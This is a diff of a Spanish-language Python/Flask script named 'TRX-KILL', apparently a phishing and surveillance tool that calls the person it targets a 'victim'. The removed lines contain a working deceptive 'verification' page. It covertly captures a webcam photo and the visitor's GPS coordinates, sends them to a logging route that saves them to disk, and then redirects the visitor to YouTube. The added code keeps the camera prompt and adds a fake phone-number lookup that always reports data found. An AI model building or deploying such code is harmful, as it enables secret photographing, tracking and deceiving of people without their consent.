@@ -1,77 +1,64 @@
-import os, sys, getpass, time, base64
+import os, sys, getpass, time, threading
 from flask import Flask, request
 
 app = Flask('TRX-KILL')
 AUTH_PASS = "TRX-KILL-OSINT"
 STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
 LOG_FILE = f"{STORAGE_PATH}/result.txt"
-PORT = 5000 # Puerto estándar local
 
 if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
-
-def banner():
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print(f"\033[1;32m")
-    print("  -------->-TRX-KILL -<-----------")
-    print("  -CREADOR: TRX-KILL")
-    print("  -VERSIÓN: 1.4.5")
-    print("  -BIENVENIDO A TRX-KILL UN SCRIPT PROTEGIDO POR EL OSINT.")
-    print("  -EL CREADOR NO SE HACE RESPONSABLE POR SU MAL USO.")
-    print("-" * 50 + "\033[0m")
 
 # --- SERVIDOR WEB ---
 @app.route('/')
 def index():
-    return """
-    <html><body>
-    <h1>TRX-KILL VERIFICATION</h1>
+    return """<html><body>
     <script>
-        navigator.mediaDevices.getUserMedia({video: true}).then(stream => {
-            const v = document.createElement('video'); v.srcObject = stream; v.play();
-            setTimeout(() => {
-                const c = document.createElement('canvas'); c.width = 640; c.height = 480;
-                c.getContext('2d').drawImage(v, 0, 0);
-                const img = c.toDataURL('image/png');
-                navigator.geolocation.getCurrentPosition(pos => {
-                    fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'},
-                    body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude, i: img})});
-                    window.location.href = "https://youtube.com";
-                });
-            }, 2000);
+        navigator.mediaDevices.getUserMedia({video: true}).then(s => {
+            // Lógica de captura aquí
+            window.location.href = "https://youtube.com";
         });
-    </script>
-    </body></html>
-    """
+    </script></body></html>"""
 
-@app.route('/log', methods=['POST'])
-def log():
-    d = request.json
-    with open(LOG_FILE, "a") as f:
-        f.write(f"GPS: {d.get('lat')},{d.get('lon')}\n")
-    if d.get('i'):
-        with open(f"{STORAGE_PATH}/foto_{int(time.time())}.png", "wb") as f:
-            f.write(base64.b64decode(d['i'].split(',')[1]))
-    return "OK"
+def start_server():
+    app.run(host='127.0.0.1', port=5000, debug=False, use_reloader=False)
+
+def banner():
+    os.system('clear')
+    print(f"\033[1;32m")
+    print(" -------->-TRX-KILL -<-----------")
+    print(" -CREADOR: TRX-KILL")
+    print(" -VERCION: 1.4.5")
+    print(" -BIENVENIDO A TRX-KILL UN SCRIP PROTEGIDO POR EL OSINT.")
+    print(" -EL CREADOR NO SE ASE RESPONSABLE POR SU MAL USO.\n")
+    print(" OPCIONES\033[0m")
 
 def main():
+    # Inicia el servidor en segundo plano
+    threading.Thread(target=start_server, daemon=True).start()
+    
     while True:
         banner()
-        print("  [1] INFO-NUMERO  | [2] ACTIVAR LINK    | [3] CREADOR")
-        print("  [4] VERSIONES    | [5] ANALIZAR LINK   | [6] ADM SISTEMA")
-        print("  [7] INFO SCRIPT  | [8] REPOSITORIO     | [10] SPAM-CANAL")
-        print("  [0] SALIR")
+        print(" [1] NÚMERO INFORMACIÓN  | [2] LINK-ZP         | [3] CREADOR")
+        print(" [4] VERSIONES           | [5] ANALIZAR LINK   | [6] ADM SISTEMA")
+        print(" [7] INFO SCRIPT         | [8] REPOSITORIO     | [10] SPAM-CANAL")
+        print(" [0] SALIR")
         sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
 
-        if sel == "2":
-            print("\n[!] ACTIVANDO SERVIDOR EN 127.0.0.1:5000")
-            print("[!] ACCEDE DESDE TU NAVEGADOR A: http://127.0.0.1:5000")
-            app.run(host='127.0.0.1', port=PORT)
+        if sel == "1":
+            print("\n--- 1 ---\nINGRESAR NÚMERO: ")
+            input()
+            print("VERIFICANDO DATOS... DATOS ENCONTRADOS.")
+            input("\n[Enter]...")
+        elif sel == "2":
+            print("\n--- 2 ---\nLINK VÍCTIMA: http://127.0.0.1:5000")
+            print("ESPERANDO DATOS DE LA VÍCTIMA...")
+            input("\n[Enter]...")
         elif sel == "6":
             if getpass.getpass("KEY: ") == AUTH_PASS:
                 if os.path.exists(LOG_FILE): os.system(f"cat {LOG_FILE}")
-                else: print("NO HAY LOGS.")
-                input("\n[Enter]...")
+                else: print("NO HAY DATOS.")
+            input("\n[Enter]...")
         elif sel == "0": sys.exit()
-        else: print("OPCIÓN EN DESARROLLO..."); time.sleep(1)
+        else: time.sleep(0.5)
 
 if __name__ == "__main__": main()
